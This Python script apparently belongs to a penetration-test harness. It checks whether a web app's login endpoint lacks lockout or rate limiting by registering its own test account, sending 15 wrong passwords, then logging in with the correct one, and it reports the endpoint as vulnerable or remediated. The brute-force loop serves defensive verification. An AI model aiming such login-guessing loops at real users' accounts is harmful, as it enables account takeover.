#!/usr/bin/env python3
"""pt28: POST /rest/user/login has no logging, alerting, lockout, or
rate limiting of any kind, so a sustained brute-force attack against
one account is indistinguishable, from the server's behavior, from
normal traffic.

Found black-box: a freshly registered test account took 15 consecutive
wrong-password attempts, every one an identical 401, no slowdown or
change in behavior between the first and the last, then logged in
successfully on the very next attempt with the correct password, no
delay, no extra verification, no visible consequence at all.

Corroborated against routes/login.ts (a raw SQL lookup, a 401 on
no match, nothing else) and a repo-wide check of server.ts, app.ts,
and the reset-password flow for any rate-limiting middleware: there is
none anywhere in this application.

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt28-001.json"
FAILED_ATTEMPTS = 15


def _request(method: str, url: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register(target: str, stamp: str) -> tuple[str, str]:
    email = f"pt28-victim-{stamp}@flatline.test"
    password = "Pt28RealPass123!"
    status, _ = _request("POST", f"{target}/api/Users", body={
        "email": email, "password": password, "passwordRepeat": password,
    })
    if status != 201:
        raise RuntimeError(f"registration of {email} failed: HTTP {status}")
    return email, password


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    email, password = _register(target, stamp)

    attempt_statuses = []
    for i in range(FAILED_ATTEMPTS):
        status, _ = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": f"WrongPassword{i}"})
        attempt_statuses.append(status)

    unthrottled_count = sum(1 for s in attempt_statuses if s == 401)
    blocked_count = sum(1 for s in attempt_statuses if s == 429)

    correct_status, correct_body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    correct_password_worked = correct_status == 200 and "authentication" in correct_body

    if unthrottled_count == FAILED_ATTEMPTS and blocked_count == 0 and correct_password_worked:
        status_result = "VULNERABLE"
        summary = f"All {FAILED_ATTEMPTS} wrong-password attempts answered identically (401), none blocked, and the correct password worked immediately after with no consequence."
    elif blocked_count > 0 and unthrottled_count < FAILED_ATTEMPTS:
        status_result = "REMEDIATED"
        summary = f"{blocked_count}/{FAILED_ATTEMPTS} wrong-password attempts were blocked (HTTP 429) before reaching the backend; the attack pattern was interrupted."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: statuses={attempt_statuses}, correct_password_worked={correct_password_worked}."

    # Legitimate case: a fresh account, correct password on the very first
    # attempt, no prior failures recorded for it.
    legit_email, legit_password = _register(target, stamp + "-legit")
    legit_status, legit_body = _request("POST", f"{target}/rest/user/login", body={"email": legit_email, "password": legit_password})
    legitimate_first_attempt_login_ok = legit_status == 200 and "authentication" in legit_body

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "attempt_statuses": attempt_statuses,
        "unthrottled_count": unthrottled_count,
        "blocked_count": blocked_count,
        "correct_password_worked": correct_password_worked,
        "summary": summary,
        "legitimate_first_attempt_login_ok": legitimate_first_attempt_login_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt28-login-bruteforce-no-monitoring", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
